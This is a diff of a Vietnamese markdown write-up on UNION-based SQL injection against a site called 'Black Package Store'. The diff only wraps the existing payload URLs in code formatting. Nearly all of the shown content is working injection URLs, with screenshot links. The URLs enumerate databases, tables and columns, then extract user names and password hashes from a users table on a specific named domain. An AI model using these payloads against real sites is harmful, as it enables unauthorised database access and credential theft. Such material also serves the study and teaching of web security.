@@ -20,7 +20,7 @@ Kiểm tra trên web "Black Package Store" `https://blackpackagestore.com/produc
 
 ## Kiểm tra database, version, user 
 
-https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+`https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`
 
 ![image](https://github.com/user-attachments/assets/81472dc4-9128-4b8a-a717-ee4fadbfa595)
 
@@ -34,28 +34,28 @@ https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,5,6,7,8
 
 **1. Liệt kê các database**
 
-https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,group_concat(0x7c,schema_name,0x7c),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+information_schema.schemata
+`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,group_concat(0x7c,schema_name,0x7c),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+information_schema.schemata`
 
 ![image](https://github.com/user-attachments/assets/3632da54-d00c-4ccb-9c56-6ec40fa147c9)
 
 **2. Liệt kê các bảng**
 
-https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+fRoM+information_schema.tables+wHeRe+table_schema='login'
+`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+fRoM+information_schema.tables+wHeRe+table_schema='login'`
 
 ![image](https://github.com/user-attachments/assets/998b38ce-8ccb-4b1b-b67a-94892b82c483)
 
 **3. Liệt kê các cột trong bảng**
 
-https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+fRoM+information_schema.columns+wHeRe+table_name=%27users%27
+`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+fRoM+information_schema.columns+wHeRe+table_name=%27users%27`
 
 ![image](https://github.com/user-attachments/assets/56202ebd-5494-4202-902c-8bcce97b7699)
 
 **4. Trích xuất dữ liệu bất kì**
-https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_name,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users
+`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_name,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users`
 
 ![image](https://github.com/user-attachments/assets/ae785d98-fb82-48b3-b93f-2db8573a8b2b)
 
-https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_password_hash,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users
+`https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_password_hash,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+users`
 
 ![image](https://github.com/user-attachments/assets/21f2d6bf-6f0e-40b0-a00e-1d82d634f08e)
 
